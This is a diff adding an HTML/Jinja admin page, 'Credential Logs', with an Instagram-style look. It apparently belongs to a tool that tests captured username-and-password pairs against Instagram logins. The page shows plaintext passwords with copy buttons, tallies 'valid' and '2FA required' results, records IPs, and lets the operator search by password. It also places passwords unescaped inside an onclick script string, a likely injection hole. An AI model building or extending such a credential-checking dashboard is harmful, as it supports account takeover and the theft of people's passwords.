@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin — Credential Logs</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0d0d14;
+      --surface: #13131f;
+      --surface2: #1a1a2a;
+      --border: #222235;
+      --accent: #c13584;
+      --text: #e8e8f0;
+      --muted: #6b6b8a;
+      --green: #22c55e;
+      --yellow: #f59e0b;
+      --red: #ef4444;
+      --blue: #3b82f6;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+    }
+
+    /* ── Header ─────────────────────────────── */
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 28px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .ig-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #833ab4, #c13584, #fd1d1d);
+    }
+
+    header h1 {
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+
+    header h1 span { color: var(--muted); font-weight: 400; }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .badge-count {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 3px 10px;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .btn-clear {
+      background: rgba(239,68,68,0.1);
+      border: 1px solid rgba(239,68,68,0.25);
+      color: var(--red);
+      border-radius: 6px;
+      padding: 6px 14px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-clear:hover { background: rgba(239,68,68,0.2); }
+
+    /* ── Stats row ───────────────────────────── */
+    .stats {
+      display: flex;
+      gap: 12px;
+      padding: 20px 28px;
+      flex-wrap: wrap;
+    }
+
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 20px;
+      min-width: 130px;
+      flex: 1;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .stat-value {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .stat-value.green  { color: var(--green); }
+    .stat-value.yellow { color: var(--yellow); }
+    .stat-value.red    { color: var(--red); }
+    .stat-value.blue   { color: var(--blue); }
+
+    /* ── Search bar ──────────────────────────── */
+    .toolbar {
+      padding: 0 28px 16px;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .search-wrap {
+      position: relative;
+      flex: 1;
+      min-width: 200px;
+      max-width: 400px;
+    }
+
+    .search-wrap svg {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 15px; height: 15px;
+      stroke: var(--muted);
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    #searchInput {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 12px 8px 34px;
+      font-size: 13px;
+      color: var(--text);
+      outline: none;
+    }
+
+    #searchInput::placeholder { color: var(--muted); }
+    #searchInput:focus { border-color: var(--accent); }
+
+    .filter-select {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 13px;
+      color: var(--text);
+      outline: none;
+      cursor: pointer;
+    }
+
+    .filter-select:focus { border-color: var(--accent); }
+
+    /* ── Table ───────────────────────────────── */
+    .table-wrap {
+      padding: 0 28px 40px;
+      overflow-x: auto;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+
+    thead th {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 10px 14px;
+      text-align: left;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    tbody tr {
+      border-bottom: 1px solid var(--border);
+      transition: background 0.1s;
+    }
+
+    tbody tr:hover { background: var(--surface2); }
+
+    tbody td {
+      padding: 11px 14px;
+      color: var(--text);
+      max-width: 240px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .td-time {
+      color: var(--muted);
+      font-size: 12px;
+      white-space: nowrap;
+    }
+
+    .td-user { font-weight: 600; }
+
+    .td-pw {
+      font-family: "Courier New", monospace;
+      font-size: 12px;
+      color: var(--yellow);
+      letter-spacing: 0.5px;
+    }
+
+    .td-ip {
+      color: var(--muted);
+      font-size: 12px;
+      font-family: monospace;
+    }
+
+    /* Status badges */
+    .badge {
+      display: inline-block;
+      padding: 3px 9px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+
+    .badge.valid            { background: rgba(34,197,94,0.12);  color: var(--green);  border: 1px solid rgba(34,197,94,0.25); }
+    .badge.bad_password     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.invalid_user     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.login_failed     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.error            { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.feedback_required{ background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.rate_limited     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.2fa_required         { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.challenge_required   { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.recaptcha_challenge  { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.contact_point_required { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+
+    .td-msg {
+      color: var(--muted);
+      font-size: 12px;
+      max-width: 260px;
+    }
+
+    /* Empty state */
+    .empty {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--muted);
+    }
+
+    .empty-icon { font-size: 40px; margin-bottom: 12px; }
+    .empty p { font-size: 14px; }
+
+    /* Copy button on password cells */
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--muted);
+      font-size: 11px;
+      margin-left: 6px;
+      padding: 2px 4px;
+      border-radius: 3px;
+      transition: color 0.15s;
+      vertical-align: middle;
+    }
+
+    .copy-btn:hover { color: var(--text); }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <div class="ig-dot"></div>
+    <h1>Admin <span>/ Credential Logs</span></h1>
+  </div>
+  <div class="header-right">
+    <span class="badge-count" id="totalCount">{{ logs|length }} entries</span>
+    <button class="btn-clear" onclick="clearLogs()">Clear All</button>
+  </div>
+</header>
+
+<!-- Stats -->
+{% set valid_count    = logs | selectattr('status', 'equalto', 'valid')       | list | length %}
+{% set twofa_count    = logs | selectattr('status', 'equalto', '2fa_required')| list | length %}
+{% set bad_pw_count   = logs | selectattr('status', 'equalto', 'bad_password') | list | length %}
+{% set other_count    = logs | length - valid_count - twofa_count - bad_pw_count %}
+
+<div class="stats">
+  <div class="stat-card">
+    <div class="stat-label">Total Checks</div>
+    <div class="stat-value blue">{{ logs|length }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Valid</div>
+    <div class="stat-value green">{{ valid_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">2FA Required</div>
+    <div class="stat-value yellow">{{ twofa_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Bad Password</div>
+    <div class="stat-value red">{{ bad_pw_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Other</div>
+    <div class="stat-value" style="color:var(--muted)">{{ other_count }}</div>
+  </div>
+</div>
+
+<!-- Toolbar -->
+<div class="toolbar">
+  <div class="search-wrap">
+    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input type="text" id="searchInput" placeholder="Search username or password…" oninput="filterTable()" />
+  </div>
+  <select class="filter-select" id="statusFilter" onchange="filterTable()">
+    <option value="">All statuses</option>
+    <option value="valid">Valid</option>
+    <option value="bad_password">Bad Password</option>
+    <option value="invalid_user">Invalid User</option>
+    <option value="2fa_required">2FA Required</option>
+    <option value="challenge_required">Challenge Required</option>
+    <option value="rate_limited">Rate Limited</option>
+    <option value="feedback_required">Feedback Required</option>
+    <option value="error">Error</option>
+  </select>
+</div>
+
+<!-- Table -->
+<div class="table-wrap">
+  {% if logs %}
+  <table id="logTable">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Timestamp</th>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Status</th>
+        <th>Message</th>
+        <th>IP</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for log in logs %}
+      <tr data-status="{{ log.status }}" data-user="{{ log.username }}" data-pw="{{ log.password }}">
+        <td class="td-time">{{ loop.index }}</td>
+        <td class="td-time">{{ log.timestamp }}</td>
+        <td class="td-user">{{ log.username }}</td>
+        <td class="td-pw">
+          {{ log.password }}
+          <button class="copy-btn" onclick="copyText('{{ log.password }}', this)" title="Copy">⎘</button>
+        </td>
+        <td>
+          <span class="badge {{ log.status }}">{{ log.status | replace('_', ' ') | title }}</span>
+        </td>
+        <td class="td-msg" title="{{ log.message }}">{{ log.message }}</td>
+        <td class="td-ip">{{ log.ip }}</td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+  {% else %}
+  <div class="empty">
+    <div class="empty-icon">📋</div>
+    <p>No credential checks logged yet.<br>Submit a check on the main page to see results here.</p>
+  </div>
+  {% endif %}
+</div>
+
+<script>
+  function filterTable() {
+    const q      = document.getElementById('searchInput').value.toLowerCase();
+    const status = document.getElementById('statusFilter').value;
+    const rows   = document.querySelectorAll('#logTable tbody tr');
+    let visible  = 0;
+
+    rows.forEach(row => {
+      const user   = row.dataset.user.toLowerCase();
+      const pw     = row.dataset.pw.toLowerCase();
+      const st     = row.dataset.status;
+      const matchQ = !q || user.includes(q) || pw.includes(q);
+      const matchS = !status || st === status;
+      const show   = matchQ && matchS;
+      row.style.display = show ? '' : 'none';
+      if (show) visible++;
+    });
+
+    document.getElementById('totalCount').textContent = visible + ' entries';
+  }
+
+  function copyText(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = '✓';
+      setTimeout(() => btn.textContent = orig, 1200);
+    });
+  }
+
+  async function clearLogs() {
+    if (!confirm('Delete all logs? This cannot be undone.')) return;
+    await fetch('/admin/clear', { method: 'POST' });
+    location.reload();
+  }
+</script>
+
+</body>
+</html>
